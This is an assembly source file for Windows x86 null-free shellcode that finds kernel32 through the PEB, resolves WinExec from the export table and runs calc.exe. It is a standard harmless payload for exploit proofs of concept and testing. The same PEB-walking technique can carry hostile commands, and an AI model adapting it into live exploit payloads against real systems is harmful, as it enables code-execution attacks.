; Copyright (c) 2009-2011, Berend-Jan "SkyLined" Wever <berendjanwever@gmail.com>
; Project homepage: http://code.google.com/p/win-exec-calc-shellcode/
; All rights reserved. See COPYRIGHT.txt for details.
BITS 32
; Windows x86 null-free shellcode that executes calc.exe.
; Works in any x86 application for Windows 5.0-7.0 all service packs.
; (See http://skypher.com/wiki/index.php/Hacking/Shellcode).
; Thanks to Peter Ferrie for suggesting to look up kernel32.dll using
; InLoadOrder and WinExec by looking for "WinE" rather than using hashes.

%include 'type-conversion.asm'

%ifdef STACK_ALIGN
    AND     SP, 0xFFFC
%endif
    XOR     EDX, EDX                    ; EDX = 0
    PUSH    EDX                         ; Stack = 0
    PUSH    B2DW('c', 'a', 'l', 'c')    ; Stack = "calc", 0
    MOV     ESI, ESP                    ; ESI = &("calc")
    PUSH    EDX                         ; Stack = 0, "calc", 0
    PUSH    ESI                         ; Stack = &("calc"), 0, "calc", 0
; Stack contains arguments for WinExec
    MOV     ESI, [FS:EDX + 0x30]        ; ESI = [TEB + 0x30] = PEB
    MOV     ESI, [ESI + 0x0C]           ; ESI = [PEB + 0x0C] = PEB_LDR_DATA
    MOV     ESI, [ESI + 0x0C]           ; ESI = [PEB_LDR_DATA + 0x0C] = LDR_MODULE InLoadOrder[0] (process)
    LODSD                               ; EAX = InLoadOrder[1] (ntdll)
    MOV     ESI, [EAX]                  ; ESI = InLoadOrder[2] (kernel32)
    MOV     EDI, [ESI + 0x18]           ; EDI = [InLoadOrder[2] + 0x18] = kernel32 DllBase
; Found kernel32 base address (EDI)
    MOV     EBX, [EDI + 0x3C]           ; EBX = [kernel32 + 0x3C] = offset(PE header)
    MOV     EBX, [EDI + EBX + 0x78]     ; EBX = [kernel32 + offset(PE header) + 0x78] = offset(export table)
; Found export table offset (EBX)
    MOV     ESI, [EDI + EBX + 0x20]     ; ESI = [kernel32 + offset(export table) + 0x20] = offset(names table)
    ADD     ESI, EDI                    ; ESI = kernel32 + offset(names table) = &(names table)
; Found export names table (ESI)
    MOV     ECX, [EDI + EBX + 0x24]     ; ECX = [kernel32 + offset(export table) + 0x20] = offset(ordinals table)
; Found export ordinals table offset (ECX)
find_winexec:
    INC     EDX                         ; EDX = function number + 1
    LODSD                               ; EAX = &(names table[function number]) = offset(function name)
    CMP     [EDI + EAX], DWORD B2DW('W', 'i', 'n', 'E') ; *(DWORD*)(function name) == "WinE" ?
    JNE     find_winexec                ;
; Found WinExec ordinal (EDX)
    LEA     EDX, [ECX + EDX * 2 - 2]    ; EDX = offset(ordinals table) + (WinExec function number + 1) * 2 - 2 = offset(WinExec function ordinal)
    MOVZX   EDX, WORD [EDI + EDX]       ; EDX = [kernel32 + offset(WinExec function ordinal)] = WinExec function ordinal
    MOV     ESI, [EDI + EBX + 0x1C]     ; ESI = [kernel32 + offset(export table) + 0x1C] = offset(address table)] = offset(address table)
    ADD     ESI, EDI                    ; ESI = kernel32 + offset(address table) = &(address table)
    ADD     EDI, [ESI + EDX * 4]        ; EDI = kernel32 + [&(address table)[WinExec ordinal]] = offset(WinExec) = &(WinExec)

    CALL    EDI                         ; WinExec(&("calc"), 0);
    INT3                                ; Crash
